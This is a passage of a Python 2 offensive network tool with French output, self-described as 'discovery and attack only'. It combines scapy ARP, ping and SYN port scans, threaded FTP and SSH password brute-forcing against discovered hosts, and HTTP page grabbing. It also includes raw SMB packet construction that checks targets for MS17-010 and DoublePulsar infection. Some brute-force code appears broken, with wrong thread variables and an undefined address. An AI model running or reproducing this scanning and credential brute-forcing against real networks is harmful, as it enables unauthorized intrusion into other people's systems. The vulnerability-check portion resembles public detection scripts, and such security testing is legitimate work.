			'\xC5\x5E']			# 'multiplex_id'
	session_setup_andx_request = [
			'\x0D',				# Word Count
			'\xFF',				# AndXCommand: No further command
			'\x00',				# Reserved
			'\x00\x00',			# AndXOffset
			'\xDF\xFF',			# Max Buffer
			'\x02\x00',			# Max Mpx Count
			'\x01\x00',			# VC Number
			'\x00\x00\x00\x00', 		# Session Key
			'\x00\x00',			# ANSI Password Length
			'\x00\x00',			# Unicode Password Length
			'\x00\x00\x00\x00', 		# Reserved
			'\x40\x00\x00\x00', 		# Capabilities
			'\x26\x00',			# Byte Count
			'\x00',				# Account
			'\x2e\x00',			# Primary Domain
			'\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00',	# Native OS: Windows 2000 2195
			'\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00']		# Native OS: Windows 2000 5.0
	return generate_smb_proto_payload(netbios, smb_header, session_setup_andx_request)

def tree_connect_andx_request(ip,userid):
	"""Generate tree connect andx request.
	"""
	logger.debug("Generate tree connect andx request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x47']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x75',				# 'smb_command': Tree Connect AndX
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x20',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			'\x00\x00',			# 'tree_id'
			'\x2F\x4B',			# 'process_id'
			userid,				# 'user_id'
			'\xC5\x5E']			# 'multiplex_id'
	ipc = "\\\\{}\IPC$\x00".format(ip)
	logger.debug("Connecting to {} with UID = {}".format(ipc, struct.unpack('>H', userid)))
	tree_connect_andx_request = [
			'\x04',				# Word Count
			'\xFF',				# AndXCommand: No further commands
			'\x00',				# Reserved
			'\x00\x00',			# AndXOffset
			'\x00\x00',			# Flags
			'\x01\x00',			# Password Length
			'\x1A\x00',			# Byte Count
			'\x00',				# Password
			ipc.encode(),			# \\xxx.xxx.xxx.xxx\IPC$
			'\x3f\x3f\x3f\x3f\x3f\x00']   	# Service
	length = len("".join(smb_header)) + len("".join(tree_connect_andx_request))
	netbios[1] = struct.pack(">L", length)[-3:]
	return generate_smb_proto_payload(netbios, smb_header, tree_connect_andx_request)

def peeknamedpipe_request(treeid, processid, userid, multiplex_id):
	"""Generate tran2 request
	"""
	logger.debug("Generate peeknamedpipe request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x4a']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x25',				# 'smb_command': Trans2
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x28',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			treeid,
			processid,
			userid,
			multiplex_id]
	tran_request = [
			'\x10',				# Word Count
			'\x00\x00',			# Total Parameter Count
			'\x00\x00',			# Total Data Count
			'\xff\xff',			# Max Parameter Count
			'\xff\xff',			# Max Data Count
			'\x00',				# Max Setup Count
			'\x00',				# Reserved
			'\x00\x00',			# Flags
			'\x00\x00\x00\x00', 		# Timeout: Return immediately
			'\x00\x00',			# Reversed
			'\x00\x00',			# Parameter Count
			'\x4a\x00',			# Parameter Offset
			'\x00\x00',			# Data Count
			'\x4a\x00',			# Data Offset
			'\x02',				# Setup Count
			'\x00',				# Reversed
			'\x23\x00',			# SMB Pipe Protocol: Function: PeekNamedPipe (0x0023)
			'\x00\x00',			# SMB Pipe Protocol: FID
			'\x07\x00',
			'\x5c\x50\x49\x50\x45\x5c\x00'] # \PIPE\
	return generate_smb_proto_payload(netbios, smb_header, tran_request)

def trans2_request(treeid, processid, userid, multiplex_id):
	"""Generate trans2 request.
	"""
	logger.debug("Generate tran2 request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x4f']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x32',				# 'smb_command': Trans2
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x07\xc0',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			treeid,
			processid,
			userid,
			multiplex_id]
	trans2_request = [
			'\x0f',				# Word Count
			'\x0c\x00',			# Total Parameter Count
			'\x00\x00',			# Total Data Count
			'\x01\x00',			# Max Parameter Count
			'\x00\x00',			# Max Data Count
			'\x00',				# Max Setup Count
			'\x00',				# Reserved
			'\x00\x00',			# Flags
			'\xa6\xd9\xa4\x00', 		# Timeout: 3 hours, 3.622 seconds
			'\x00\x00',			# Reversed
			'\x0c\x00',			# Parameter Count
			'\x42\x00',			# Parameter Offset
			'\x00\x00',			# Data Count
			'\x4e\x00',			# Data Offset
			'\x01',				# Setup Count
			'\x00',				# Reserved
			'\x0e\x00',			# subcommand: SESSION_SETUP
			'\x00\x00',			# Byte Count
			'\x0c\x00' + '\x00' * 12]
	return generate_smb_proto_payload(netbios, smb_header, trans2_request)

# https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/
# https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_ms17_010
# https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb
# https://www.symantec.com/security_response/vulnerability.jsp?bid=96707
# https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/[MS-SMB2]-151016.pdf
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa365233(v=vs.85).aspx
# https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
# https://community.rapid7.com/community/metasploit/blog/2017/04/03/introducing-rubysmb-the-protocol-library-nobody-else-wanted-to-write
# https://msdn.microsoft.com/en-us/library/ee441741.aspx
# https://github.com/countercept/doublepulsar-detection-script/blob/master/detect_doublepulsar_smb.py
# http://stackoverflow.com/questions/38735421/packing-an-integer-number-to-3-bytes-in-python
# https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
# https://github.com/worawit/MS17-010/blob/master/BUG.txt

def conn(host):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.settimeout(5)
	client.connect((host, 445))
	return client

'''
SMB_HEADER architecture:
	"server_component : 04x"
	"smb_command      : 01x"
	"error_class      : 01x"
	"reserved1        : 01x"
	"error_code       : 02x"
	"flags            : 01x"
	"flags2           : 02x"
	"process_id_high  : 02x"
	"signature        : 08x"
	"reserved2        : 02x"
	"tree_id          : 02x"
	"process_id       : 02x"
	"user_id          : 02x"
	"multiplex_id     : 02x"
'''

def smb_handler(client, payload):
	client.send(payload)
	tcp_response = client.recv(buffersize)
	arch_smb = {
		'netbios' : tcp_response[:4],
		'response': tcp_response[36:]
	}
	arch_smb['smb_header'] = { 	# smb_header : 32 bytes
		'server_component':	tcp_response[4:8],
		'smb_command'	  :	tcp_response[8:9],
		'error_class'	  :	tcp_response[9:10],
		'reserved1'	  :	tcp_response[10:11],
		'error_code'	  :	tcp_response[11:13],
		'flags'		  :	tcp_response[13:14],
		'flags2'	  :	tcp_response[14:16],
		'process_id_high' :	tcp_response[16:18],
		'signature'	  :	tcp_response[18:26],
		'reserved2'	  :	tcp_response[26:28],
		'tree_id'	  :	tcp_response[28:30],
		'process_id'	  :	tcp_response[30:32],
		'user_id'	  :	tcp_response[32:34],
		'multiplex_id'	  :	tcp_response[34:36]
	}
	return arch_smb

# Network scan part ==============================================================================
def long2net(arg):
	if (arg <= 0 or arg >= 0xFFFFFFFF):
		raise ValueError("\033[91m[-]\033[0m Valeur du masque illégale.", hex(arg))
	return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

def to_CIDR_notation(bytes_network, bytes_netmask):
	network = scapy.utils.ltoa(bytes_network)
	netmask = long2net(bytes_netmask)
	net = "%s/%s" % (network, netmask)
	if netmask < 16:
		logger.warn("\033[91m[-]\033[0m %s est trop gros." % net)
		return None
	return net

def mac_address_id(line):
	constructor_id = line[:8]
	for manufacturer in known_hw_constructor:
		if constructor_id in known_hw_constructor[manufacturer]:
			return line + '  ' + manufacturer
	return line

def scan_and_print_neighbors(net, interface, timeout=1):
	global ips_o
	print_fmt("\n\033[94m[ARP]\033[0m %s sur %s" % (net, interface))
	try:
		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
		for s, r in ans.res:
			line = r.sprintf("%Ether.src%  %ARP.psrc%")
			ips_o.append(line.split(' ')[2])
			line = mac_address_id(line)
			try:
				hostname = socket.gethostbyaddr(r.psrc)
				line += " " + hostname[0]
			except socket.herror:
				pass
			except KeyboardInterrupt:
				print '\033[91m[-]\033[0m L\'utilisateur a choisi l\'interruption du process.'
				break
			logger.info("\033[96m[ONLINE]\033[0m " + line)
	except socket.error as e:
		if e.errno == errno.EPERM:
			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
		else:
			raise

def local_network_scan():
	for network, netmask, _, interface, address in scapy.config.conf.route.routes:
		if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
			continue
		if netmask <= 0 or netmask == 0xFFFFFFFF:
			continue
		net = to_CIDR_notation(network, netmask)
		if interface != scapy.config.conf.iface:
			logger.warn("\033[92m[*]\033[0m Ignore %s car Scapy ne supporte pas ce type d'interface.", net)
			continue
		if net:
			scan_and_print_neighbors(net, interface)

def checkhost(ip):
	global ips_o
	conf.verb = 0
	try:
		ping, no = sr(IP(dst=ip)/ICMP(), timeout=1.5, retry=-2)
		if ping.res:
			logger.info("\033[96m[ONLINE]\033[0m Cible: " + ip)
			ips_o.append(ip)
	except socket.error as e:
		if e.errno == errno.EPERM:
			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
		else:
			pass
	except Exception as e:
		logger.error("\033[91m[-]\033[0m %s.", e.strerror)
		pass

def network_scan(ip):
	mask 	  = [255,255,255,0]
	ipf 	  = ip.split('.')
	pre 	  = [str(int(ipf[i]) & mask[i]) for i in range(len(ipf))]
	ip_reseau = pre[0] + '.' + pre[1] + '.' + pre [2] + '.'
	relicat   = 255 - int(pre[3])
	all_hosts = relicat if relicat != 255 else 255
	return [ip_reseau + str(suffixe) for suffixe in range(int(pre[3]),all_hosts,1)]

# Nmap part ==========================================================================================
def scanner(target):
	global online, bf_ok
	ports_i = []
	for port in known_ports:
		try:
			srcport = randint(20000,40000)
			conf.verb = 0
			SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
			pktflags = SYNACKpkt.getlayer(TCP).flags
			if pktflags == SYNACK:
				logger.info('\033[96m[PORT]\033[0m En écoute : \033[33m{}\033[0m sur la cible --> {}'.format(port, target))
				ports_i.append(port)
				if port == 22 or port == 2222 or port == 21:
					bf_ok = True
			else:
				RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
				send(RSTpkt)
			online[target] = ports_i
		except KeyboardInterrupt:
			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
			send(RSTpkt)
			print "\n\033[92m[*]\033[0m La requete s'est stoppée sur demande utilisateur."
		except Exception as e:
			#logger.error("\033[91m[-]\033[0m {}: {}".format(e, target))
			pass

def port_scan(ip):
	global ips_o, online
	all_hosts = []
	try:
		if ip == get_ip():
			print_fmt('\n\033[92m[*]\033[0m Scan du réseau local:')
			local_network_scan()
			if not ips_o:
				sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
		else:
			print_fmt('\n\033[92m[*]\033[0m Scan du réseau distant:')
			all_hosts = network_scan(ip)
			threads = []
			for host in all_hosts:
				proc = Thread(target=checkhost,args=(host,))
				threads.append(proc)
				proc.start()
			for thr in threads:
				thr.join()
		if ips_o:
			print_fmt('\n\033[92m[*]\033[0m Scan de port sur les machines ARPées:')
			threads = []
			for ip in ips_o:
				proc = Thread(target=scanner,args=(ip,))
				threads.append(proc)
				proc.start()
			for thr in threads:
				thr.join()
		else:
			sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
		print_fmt('\n\033[92m[*]\033[0m Résumé du scan de ports:')
		print online
	except KeyboardInterrupt:
		logger.info('\n\033[93m[*]\033[0m Interruption utilisateur.')
		sys.exit(-1)
	except Exception as e:
		logger.error('\n\033[92m[-]\033[0m Erreur port_scan({}): \033[31m{}\033[0m'.format(ip, e))

def get_ip():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(("8.8.8.8",80))
		ret = s.getsockname()[0]
		s.close()
		return ret
	except:
		sys.exit('\033[91m[-]\033[0m Déconnecté du réseau?\n')

# Arguments handler part ===============================================================================
def get_args():
	args = ArgumentParser(version='3.8',description='Discovery and attack only, made by Cesium133.')
	args.add_argument('-b','--bruteforce',
		action='store_true',
		default=False,
		help='Argument optionnel pour déclencher le mode attaque.')
	args.add_argument('-i','--ip',
		action='store',
		nargs=1,
		help='Machine cible.')
	args.add_argument('-w','--wordlist',
		action='store',
		nargs=1,
		help='Ajout d\'un dictionnaire.')
	args.add_argument('-u','--username',
		action='store',
		nargs=1,
		default=['admin'],
		help='Username distant à BF.')
	args.add_argument('-m','--mode',
		action='store',
		nargs=1,
		default=['lower'],
		help='Alphabet de bruteforce [lower | upper | digits | letters+digits | hex | all].')
	args.add_argument('-l','--longueur',
		action='store',
		nargs=1,
		default=['3'],
		help='Longueur des mots de passe souhaitée.')
	return args.parse_args()


# Entry point ==========================================================================================
if __name__ == '__main__':
	args = get_args()
	ip = get_ip() if args.ip is None else args.ip[0]
	logger.info('\033[93m[IP]\033[0m {}'.format(ip))
#
#	from multiprocessing import Pool
#	with open(args.wordlist[0],'r') as dico:
#		pool = Pool(4)
#		pool.map(detonate,dico,4)
#
	ips = network_scan(ip)
	port_scan(ip)

	if args.bruteforce and bf_ok:
		user = args.username[0]
		print
		logger.info('\033[93m[USER]\033[0m {}'.format(user))
		if args.wordlist is not None:
			try:
				print_fmt("\033[94m[WL]\033[0m Prise en compte de la wordlist: " + args.wordlist[0])
				with open(args.wordlist[0],'rb') as wl:
					dic = wl.read().replace('\r','').split('\n')
			except:
				print '\033[91m[WL]\033[0m une erreur est survenue: Ouverture de la wordlist.'
				sys.exit(-1)
		else:
			print_fmt("\033[94m[BF]\033[0m Generation du dictionnaire.")
			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
			dic = generate(args.mode[0], args.longueur[0])
	elif args.bruteforce:
		print '\n\033[94m[~]\033[0m Pas de ports à bruteforcer [21/22/2222].'

	print_fmt('\n\033[92m[*]\033[0m Phase de capture/reconnaissance brutale:')

	if online is not None:
		for host in online:
# FTP ----------------------------------------------------------------------------------------------------------
			if args.bruteforce and bf_ok:
				idx = 0
				if 21 in online[host]:
					print "\n\033[33m[FTP]\033[0m Cible avec FTP ouvert : %s." % host
					try:
						threads = []
						for item in dic:
							t = Thread(target=detonate,args=(user,ip,item,idx,))
							threads.append(t)
							t.start()
							idx += 1
							if len(threads) >= 10:
								for thr in threads:
									thr.join()
								threads = []
							if ftop == 1:
								ftop = 0
								break
					except KeyboardInterrupt:
						print '\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("\033[91m[-]\033[0m BF FTP.")
				idx = 0
# SSH ----------------------------------------------------------------------------------------------------------
				if 22 in online[host] or 2222 in online[host]:
					port_idx = [x for i,x in enumerate(online[host]) if x == 22 or x == 2222]
					print "\n\033[31m[SSH]\033[0m Cible avec SSH ouvert : %s sur %d." % (host, online[host][port_idx[0]])
					try:
						threads = []
						for psswd in dic:
							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,online[host][port_idx[0]],))
							threads.append(t)
							conn.start()
							idx += 1
							if len(threads) >= 10:
								for thr in threads:
									thr.join()
								threads = []
							if flag == 1:
								flag = 0
								break
					except KeyboardInterrupt:
						print '\n\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("\033[91m[-]\033[0m BF SSH")
# HTTP ---------------------------------------------------------------------------------------------------------
			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
				port_idx = [x for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
				print "\n\033[35m[HTTP]\033[0m Getting page -> Cible avec HTTP ouvert : {} sur le port {}.".format(host, port_idx[0])
				for item in port_idx:
					page = query(item, host)
					with open('HTTP-' + host + '-page.html','w') as f:
						f.write(page)
# HTTPS --------------------------------------------------------------------------------------------------------
			if 443 in online[host]:
				print "\n\033[1m[HTTPS]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
				page = query(443, host)
				with open('HTTPS-' + host + '-page.html','w') as f:
					f.write(page)
# SMB [Vérifie si le poste est vulnérable à MS17-010] ----------------------------------------------------------
			if 445 in online[host]:
				print "\n\033[36m[SMB/CIFS]\033[0m Vuln MS17-010 -> Cible avec SMB ouvert : %s." % host
				native_os = 'OS-NOTFOUND'
				try:
					# Connexion
					smb_client = conn(host)
					# P1: negotiate_proto_request
					payload 	 = negotiate_proto_request()
					smb_response = smb_handler(smb_client, payload)
					# P2: session_setup_andx_request
					payload 	 = session_setup_andx_request()
					smb_response = smb_handler(smb_client, payload)
					# P3: tree_connect_andx_request
					userid 		 = smb_response['smb_header']['user_id']
					native_os 	 = smb_response['response'][9:].split('\x00')[0]
					payload 	 = tree_connect_andx_request(host, userid)
					smb_response = smb_handler(smb_client, payload)
					# P4: peeknamedpipe_request
					treeid 		 = smb_response['smb_header']['tree_id']
					processid 	 = smb_response['smb_header']['process_id']
					userid 		 = smb_response['smb_header']['user_id']
					multiplex_id 	 = smb_response['smb_header']['multiplex_id']
					payload 	 = peeknamedpipe_request(treeid, processid, userid, multiplex_id)
					smb_response = smb_handler(smb_client, payload)
					# Cible vulnérable ?
#
#					nt_status = smb.error_class, smb.reserved1, smb.error_code
#					0xC0000205 - STATUS_INSUFF_SERVER_RESOURCES - vulnerable
#					0xC0000008 - STATUS_INVALID_HANDLE
#					0xC0000022 - STATUS_ACCESS_DENIED
#
					nt_status = smb_response['smb_header']['error_class'] + \
								smb_response['smb_header']['reserved1'] + \
								smb_response['smb_header']['error_code']
					if nt_status == '\x05\x02\x00\xc0':
						logger.info("\033[33m[VULNERABLE]\033[0m [{}] semble être VULNERABLE à MS17-010! (\033[33m{}\033[0m)".format(host, native_os))
						if args.bruteforce:
							# P5: trans2_request
							payload = trans2_request(treeid, processid, userid, multiplex_id)
							smb_response = smb_handler(smb_client, payload)
							signature = smb_response['smb_header']['signature']
							multiplex_id = smb_response['smb_header']['multiplex_id']
							if multiplex_id == '\x00\x51' or multiplex_id == '\x51\x00':
								key = calculate_doublepulsar_xor_key(signature)
								logger.info("\033[33m[INFECTED]\033[0m Le poste est INFECTE par DoublePulsar! - XOR Key: {}".format(key))
					elif nt_status in ('\x08\x00\x00\xc0', '\x22\x00\x00\xc0'):
						logger.info("\033[92m[+]\033[0m [{}] ne semble PAS vulnérable! (\033[33m{}\033[0m)".format(ip, native_os))
					else:
						logger.info('\033[93m[~]\033[0m Non détecté! (\033[33m{}\033[0m)'.format(native_os))
					smb_client.close()
				except socket.error as e:
					logger.error("\n\033[91m[-]\033[0m Socket error: {} (\033[33m{}\033[0m)".format(e, native_os))
					smb_client.close()
				except Exception as e:
					logger.error("\n\033[91m[-]\033[0m Undefined error: {} (\033[33m{}\033[0m)".format(e, native_os))
					smb_client.close()
		sys.exit('\n\033[91m[+]\033[0m # Job done #\n')
	else:
		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
